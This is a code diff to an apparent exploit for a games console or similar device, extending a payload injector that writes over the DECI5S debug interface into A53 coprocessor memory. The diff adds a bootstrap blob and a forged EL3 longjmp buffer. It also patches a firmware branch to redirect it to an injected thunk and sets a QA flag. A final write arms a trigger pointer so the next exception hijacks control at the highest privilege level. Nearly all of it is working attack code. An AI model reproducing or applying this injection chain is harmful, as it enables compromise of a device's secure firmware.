@@ -28,6 +28,7 @@
 #include "mp4_deci5s.h"
 #include "prosperous.h"
 #include "mp4_thunk.h"
+#include "mp4_bootstrap.h"
 
 /* FreeBSD struct offsets for device discovery */
 #define FILE_F_VNODE    0x18
@@ -313,6 +314,12 @@ static int deci5s_read(uint64_t a53_pa, void *dst, uint32_t len)
     return (int)nr;
 }
 
+/* Public wrapper for deci5s_read, used by main.c diagnostics */
+int deci5s_read_mem(uint64_t a53_pa, void *dst, uint32_t len)
+{
+    return deci5s_read(a53_pa, dst, len);
+}
+
 /*
  * Write a buffer to A53 memory in 64-byte chunks via DECI5S.
  */
@@ -563,8 +570,6 @@ static int deci5s_init_state(void)
  * A53 PA = 0x88000000 + DRAM_offset
  * (where DRAM_offset = x86_PA - 0x60000000)
  */
-#define A53_DRAM_PA_BASE  0x88000000ULL
-
 /* Pre-compiled MP4 payload binary (same as in mp4_inject.c) */
 extern const unsigned char mp4_payload_bin[];
 extern const unsigned int mp4_payload_bin_len;
@@ -597,7 +602,7 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
         return -1;
     }
 
-    /* Step 1: Write thunk at DRAM offset 0xE0000 (A53 PA 0x880E0000) */
+    /* Step 1: Write thunk at DRAM offset 0xE0000 (A53 VA 0x1E0000) */
     printf("[*] DECI5S: Writing thunk (%u bytes) to A53 PA 0x%llx...\n",
            mp4_thunk_bin_len,
            (unsigned long long)(A53_DRAM_PA_BASE + MP4_THUNK_OFFSET));
@@ -608,7 +613,7 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
         return ret;
     }
 
-    /* Step 2: Write main payload at DRAM offset 0x7F1000 (A53 PA 0x887F1000) */
+    /* Step 2: Write main payload at DRAM offset 0x3F1000 */
     printf("[*] DECI5S: Writing payload (%u bytes) to A53 PA 0x%llx...\n",
            mp4_payload_bin_len,
            (unsigned long long)(A53_DRAM_PA_BASE + MP4_PAYLOAD_OFFSET));
@@ -619,15 +624,64 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
         return ret;
     }
 
-    /* Step 3: Patch BL is_qaf -> BL thunk at hook site
+    /* Step 3: Write bootstrap at DRAM offset 0x3F0000.
+     * This is the one-shot IC IALLU code that runs via jmpbuf hijack.
+     * Placed at a never-executed address so no stale I-cache entries. */
+    printf("[*] DECI5S: Writing bootstrap (%u bytes) to A53 PA 0x%llx...\n",
+           mp4_bootstrap_bin_len,
+           (unsigned long long)(A53_DRAM_PA_BASE + MP4_BOOTSTRAP_OFFSET));
+    ret = deci5s_write_buf(A53_DRAM_PA_BASE + MP4_BOOTSTRAP_OFFSET,
+                           mp4_bootstrap_bin, mp4_bootstrap_bin_len);
+    if (ret != 0) {
+        printf("[!] DECI5S: Bootstrap write failed\n");
+        return ret;
+    }
+
+    /* Step 4: Build and write fake jmpbuf at DRAM offset 0x3EF000.
      *
-     * Hook site: A53 VA 0x108BD4 = DRAM offset 0x8BD4
-     *            (A53_HOOK_ADDR - A53_ELF_BASE = 0x108BD4 - 0x100000 = 0x8BD4)
-     *            A53 PA = 0x88008BD4
+     * Jmpbuf layout (custom EL3 longjmp sub_107BE0):
+     *   qword_123180 + 0x00: [8 bytes skipped by +8 in call]
+     *   qword_123180 + 0x08: SP          → valid SRAM stack
+     *   qword_123180 + 0x10: SPSR_EL3    → 0x3CD (EL3h, DAIF masked)
+     *   qword_123180 + 0x18: ELR_EL3     → firmware return addr (for ERET)
+     *   qword_123180 + 0x20: X19..X28    → 0
+     *   qword_123180 + 0x70: X29, X30    → X30 = bootstrap VA (for RET)
      *
-     * Thunk at: A53 VA 0x1E0000 = DRAM offset 0xE0000
-     *           (A53_ELF_BASE + MP4_THUNK_OFFSET = 0x100000 + 0xE0000 = 0x1E0000)
+     * Flow: sub_107BE0 RETs to X30 (bootstrap) → IC IALLU → ERET to ELR_EL3
+     * (safe firmware address). After ERET, normal IRQ handling resumes with
+     * I-cache flushed, so our code patches at 0x108BD4 and 0x1E0000 take effect.
+     */
+    {
+        uint8_t jmpbuf[0x80];
+        uint64_t bootstrap_va = A53_IDENTITY_BASE + MP4_BOOTSTRAP_OFFSET;
+        uint64_t sp_val       = 0x1A00;         /* SRAM stack (from FW analysis) */
+        uint64_t eret_target  = A53_IDLE_LOOP_VA; /* 0x108BF4: safe B loop in IRQ handler */
+
+        build_jmpbuf(jmpbuf, bootstrap_va, sp_val, eret_target);
+
+        printf("[*] DECI5S: Writing jmpbuf (0x80 bytes) to A53 PA 0x%llx...\n",
+               (unsigned long long)(A53_DRAM_PA_BASE + MP4_JMPBUF_OFFSET));
+        printf("[*]   X30 (RET target)  = 0x%llx (bootstrap)\n",
+               (unsigned long long)bootstrap_va);
+        printf("[*]   ELR_EL3 (ERET)    = 0x%llx (IRQ handler loop)\n",
+               (unsigned long long)eret_target);
+        printf("[*]   SP                = 0x%llx (SRAM)\n",
+               (unsigned long long)sp_val);
+        printf("[*]   SPSR_EL3          = 0x%llx (EL3h, masked)\n",
+               (unsigned long long)BOOTSTRAP_SPSR_EL3);
+
+        ret = deci5s_write_buf(A53_DRAM_PA_BASE + MP4_JMPBUF_OFFSET,
+                               jmpbuf, sizeof(jmpbuf));
+        if (ret != 0) {
+            printf("[!] DECI5S: Jmpbuf write failed\n");
+            return ret;
+        }
+    }
+
+    /* Step 5: Patch BL is_qaf -> BL thunk at hook site.
      *
+     * Hook site: A53 VA 0x108BD4 = DRAM offset 0x8BD4, A53 PA 0x88008BD4
+     * Thunk at:  A53 VA 0x1E0000 = DRAM offset 0xE0000
      * BL encoding: 0x94000000 | (offset_in_words & 0x3FFFFFF)
      */
     int32_t bl_offset = ((int32_t)(A53_ELF_BASE + MP4_THUNK_OFFSET) -
@@ -643,7 +697,7 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
         return ret;
     }
 
-    /* Step 4: Enable QAF flag at DRAM offset 0x123B74 (A53 PA 0x88123B74) */
+    /* Step 6: Enable QAF flag at 0x123B74 */
     uint32_t qaf_flag = 1;
     ret = deci5s_write(A53_DRAM_PA_BASE + A53_QAF_FLAGS_OFF, &qaf_flag, 4);
     if (ret != 0) {
@@ -651,7 +705,31 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
         return ret;
     }
 
-    /* Verify writes by reading back */
+    /* Step 7: ARM THE JMPBUF TRIGGER — write qword_123180.
+     *
+     * This is the critical write. As soon as qword_123180 != 0, the next
+     * exception on the A53 will longjmp to our bootstrap → IC IALLU.
+     *
+     * We write the jmpbuf DRAM VA (offset-mapped: 0x3EF000) to 0x123180.
+     * sub_107BE0 is called with (qword_123180 + 8), so it reads the jmpbuf
+     * starting at VA 0x3EF008.
+     *
+     * IMPORTANT: This must be the LAST write, after all code/data is in place.
+     */
+    {
+        uint64_t jmpbuf_ptr = (uint64_t)MP4_JMPBUF_OFFSET;  /* VA 0x3EF000 */
+        printf("[*] DECI5S: Arming jmpbuf trigger at VA 0x%x = 0x%llx...\n",
+               A53_JMPBUF_PTR_OFF, (unsigned long long)jmpbuf_ptr);
+
+        ret = deci5s_write(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF,
+                           &jmpbuf_ptr, 8);
+        if (ret != 0) {
+            printf("[!] DECI5S: Jmpbuf trigger write failed\n");
+            return ret;
+        }
+    }
+
+    /* Verify critical writes */
     uint32_t verify;
     deci5s_read(hook_a53_pa, &verify, 4);
     printf("[DECI5S] Verify hook: 0x%08x (expect 0x%08x) %s\n",
@@ -661,42 +739,31 @@ int deci5s_inject_payload(struct phys_rw_ctx *ctx)
     printf("[DECI5S] Verify QAF: 0x%08x (expect 0x00000001) %s\n",
            verify, verify == 1 ? "OK" : "MISMATCH");
 
-    /* Read first 4 bytes of thunk to verify */
     deci5s_read(A53_DRAM_PA_BASE + MP4_THUNK_OFFSET, &verify, 4);
     printf("[DECI5S] Verify thunk[0]: 0x%08x (expect 0x%08x) %s\n",
            verify, *(const uint32_t *)mp4_thunk_bin,
            verify == *(const uint32_t *)mp4_thunk_bin ? "OK" : "MISMATCH");
 
-    /* Verify payload at new address (DRAM only — DO NOT read MMIO via DECI5S,
-     * PA_TO_EL3_VA doesn't handle MMIO and will crash the A53) */
+    deci5s_read(A53_DRAM_PA_BASE + MP4_BOOTSTRAP_OFFSET, &verify, 4);
+    printf("[DECI5S] Verify bootstrap[0]: 0x%08x (expect 0x%08x) %s\n",
+           verify, *(const uint32_t *)mp4_bootstrap_bin,
+           verify == *(const uint32_t *)mp4_bootstrap_bin ? "OK" : "MISMATCH");
+
     uint32_t payload_verify = 0;
     deci5s_read(A53_DRAM_PA_BASE + MP4_PAYLOAD_OFFSET, &payload_verify, 4);
-    printf("[DECI5S] Payload[0] at PA 0x%llx: 0x%08x (expect 0x%08x) %s\n",
-           (unsigned long long)(A53_DRAM_PA_BASE + MP4_PAYLOAD_OFFSET),
+    printf("[DECI5S] Verify payload[0]: 0x%08x (expect 0x%08x) %s\n",
            payload_verify, *(const uint32_t *)mp4_payload_bin,
            payload_verify == *(const uint32_t *)mp4_payload_bin ? "OK" : "MISMATCH");
 
-    /* Dump firmware code around hook site to analyze the QA code path.
-     * After is_qaf returns 1 (QAF flag is set), the handler enters QA-specific
-     * processing. We need to understand this path to find a DATA-based hook
-     * (code patches don't work due to I-cache coherency). */
-    printf("[DECI5S] Dumping firmware around hook site 0x%x...\n", A53_HOOK_ADDR);
-    uint32_t fw_dump[64]; /* 256 bytes = 64 instructions */
-    uint64_t dump_start = A53_DRAM_PA_BASE + (A53_HOOK_ADDR - A53_ELF_BASE) - 64;
-    memset(fw_dump, 0, sizeof(fw_dump));
-    /* Read in 32-byte chunks (8 words) to stay under 64-byte DECI5S limit */
-    for (int i = 0; i < 8; i++) {
-        deci5s_read(dump_start + i * 32, &fw_dump[i * 8], 32);
-    }
-    uint32_t hook_va_start = A53_HOOK_ADDR - 64;
-    for (int i = 0; i < 64; i++) {
-        uint32_t va = hook_va_start + i * 4;
-        const char *marker = "";
-        if (va == A53_HOOK_ADDR) marker = " <-- HOOK (BL is_qaf)";
-        if (fw_dump[i] != 0)
-            printf("[FW] 0x%06x: %08x%s\n", va, fw_dump[i], marker);
-    }
+    /* Verify jmpbuf trigger is armed */
+    uint64_t armed_val = 0;
+    deci5s_read(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF, &armed_val, 8);
+    printf("[DECI5S] Verify jmpbuf ptr @ 0x%x: 0x%llx (expect 0x%x) %s\n",
+           A53_JMPBUF_PTR_OFF, (unsigned long long)armed_val,
+           MP4_JMPBUF_OFFSET,
+           (uint32_t)armed_val == MP4_JMPBUF_OFFSET ? "ARMED" : "MISMATCH");
 
-    printf("[+] DECI5S: Payload injection complete\n");
+    printf("[+] DECI5S: Injection complete — jmpbuf armed\n");
+    printf("[+] Next A53 exception will trigger: IC IALLU → thunk active\n");
     return 0;
 }
